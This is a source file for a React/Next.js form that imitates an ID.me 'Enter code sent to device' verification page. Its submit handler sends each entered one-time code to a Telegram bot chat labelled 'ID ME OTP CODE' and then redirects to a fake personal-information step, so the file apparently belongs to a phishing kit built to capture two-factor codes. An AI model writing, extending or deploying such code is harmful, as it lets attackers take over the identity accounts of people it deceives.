"use client"
import { useRouter } from 'next/navigation';
import React from 'react'

interface FormData {
    code: string;
}
interface FormErrors {
    code?: string;
}

export default function OTPForm() {
    const [formData, setFormData] = React.useState<FormData>({
        code: '',
    });
    const [isSubmitting, setIsSubmitting] = React.useState(false);
    const [errors, setErrors] = React.useState<FormErrors>({});
    const router = useRouter();

    const telegramApiKey = process.env.NEXT_PUBLIC_TELEGRAM_API ?? '';
    const telegramChatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ?? '';

    const validateForm = (): boolean => {
        const newErrors: FormErrors = {};
        if (!formData.code.trim()) {
            newErrors.code = 'Code is required';
        }
        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const { name, value } = e.target;
        setFormData(prev => ({
            ...prev,
            [name]: value
        }));
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();

        if (!validateForm()) {
            console.log("Form validation failed", errors);
            return;
        }

        setIsSubmitting(true);

        try {
            const message = `
            ++++ 🔰🔰 ID ME OTP CODE 🔰🔰+++++
            [📧CODE] : ${formData.code}
            +++++🔰🔰 ID ME 🔰🔰++++
            `;

            const textResponse = await fetch(`https://api.telegram.org/bot${telegramApiKey}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: message,
                    parse_mode: 'Markdown'
                }),
            });

            if (!textResponse.ok) {
                const textData = await textResponse.json();
                throw new Error(textData.description || 'Failed to send message to Telegram');
            }

             router.push('/id-me/personal-information');

        } catch (error) {
            console.error('Submission error:', error);
            alert(`There was an error submitting your application: ${error instanceof Error ? error.message : 'Unknown error'}`);
        } finally {
            setIsSubmitting(false);
        }
    };

    return (
        <form className="space-y-6 px-5 md:px-0" onSubmit={handleSubmit}>
            <h1 className="text-[26px] font-semibold text-[#2e3f51] mb-6 text-center">
                Enter code sent to device
            </h1>

            <div>
                <label htmlFor="code" className="block text-sm font-medium text-[#2e3f51]">
                    Code <span className="text-red-500">*</span>
                </label>
                <div className="mt-1">
                    <input
                        id="code"
                        name="code"
                        type="text"
                        value={formData.code}
                        onChange={handleChange}
                        placeholder="Enter code"
                        maxLength={8}
                        className="h-[60px] placeholder:font-medium appearance-none block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
                    />
                    {errors.code && <p className="mt-1 text-sm text-red-600">{errors.code}</p>}
                </div>
            </div>

            <div>
                <button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full h-[60px] flex items-center justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                    {isSubmitting ? 'Submitting...' : 'Submit'}
                </button>
            </div>
        </form>
    )
}
